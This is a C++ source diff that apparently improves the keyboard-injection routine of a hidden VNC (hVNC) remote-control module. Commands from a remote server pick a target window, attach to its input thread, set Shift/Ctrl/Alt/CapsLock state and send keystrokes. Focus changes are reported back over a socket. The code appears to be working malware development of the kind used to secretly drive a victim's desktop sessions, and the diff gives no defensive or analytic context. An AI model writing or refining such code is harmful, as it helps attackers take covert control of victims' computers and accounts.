@@ -922,25 +922,62 @@ static void input_loop() {
         const string& action = task.action;
         const json&   cmd    = task.cmd;
 
-        // ---- Klavye ----
+                                // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = target_window_from_screen_point(g_lastMousePos);
+            int states = cmd.value("states", 0);
+
+            HWND hTarget = NULL;
+            if (cmd.contains("focused_hwnd")) {
+                hTarget = (HWND)(uintptr_t)cmd.value("focused_hwnd", 0ULL);
+            }
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
+            if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) continue;
 
+            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+            DWORD currentThreadId = GetCurrentThreadId();
+
+            // Sync modifiers and toggle state using AttachThreadInput + SetKeyboardState
+            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+
+            BYTE keyState[256];
+            if (GetKeyboardState(keyState)) {
+                bool localCaps = (keyState[0x14] & 1) != 0;
+                bool serverCaps = (states & 8) != 0;
+
+                // If CapsLock state differs, send a toggle tap to ensure the thread's message loop perceives it
+                if (vk != 0x14 && localCaps != serverCaps) {
+                    PostMessageW(hTarget, WM_KEYDOWN, 0x14, key_lparam(0x14, false));
+                    PostMessageW(hTarget, WM_KEYUP, 0x14, key_lparam(0x14, true));
+                }
+
+                // Explicitly set the modifier bits in the thread's state table
+                keyState[0x10] = (states & 1) ? 0x80 : 0; // Shift
+                keyState[0x11] = (states & 2) ? 0x80 : 0; // Control
+                keyState[0x12] = (states & 4) ? 0x80 : 0; // Menu (Alt)
+                keyState[0x14] = serverCaps ? 0x01 : 0;   // Toggle bit
+                SetKeyboardState(keyState);
+            }
+
             if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+                SendMessageTimeoutW(hTarget, WM_CHAR, (WPARAM)vk, 1, SMTO_ABORTIFHUNG, 500, NULL);
             } else {
                 bool isKeyUp = (action == "hvnc_keyup");
                 UINT msg = isKeyUp ? WM_KEYUP : WM_KEYDOWN;
+                SendMessageTimeoutW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, isKeyUp), SMTO_ABORTIFHUNG, 500, NULL);
+            }
 
-                // Sync global state for toggle/modifier keys
-                if (vk == 0x14 || vk == 0x10 || vk == 0x11 || vk == 0x12) {
-                    keybd_event((BYTE)vk, 0, isKeyUp ? KEYEVENTF_KEYUP : 0, 0);
-                }
+            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
 
-                PostMessageW(hTarget, msg, (WPARAM)vk, key_lparam((WORD)vk, isKeyUp));
+            // Notify server of current focus if it changed
+            HWND hFore = GetForegroundWindow();
+            if (hFore && hFore != g_hLastWindow) {
+                g_hLastWindow = hFore;
+                json ack;
+                ack["action"] = "hvnc_focus_ack";
+                ack["hwnd"] = (uintptr_t)hFore;
+                safe_send_json(g_socket, ack);
             }
 
             g_forceFullFrame = true;
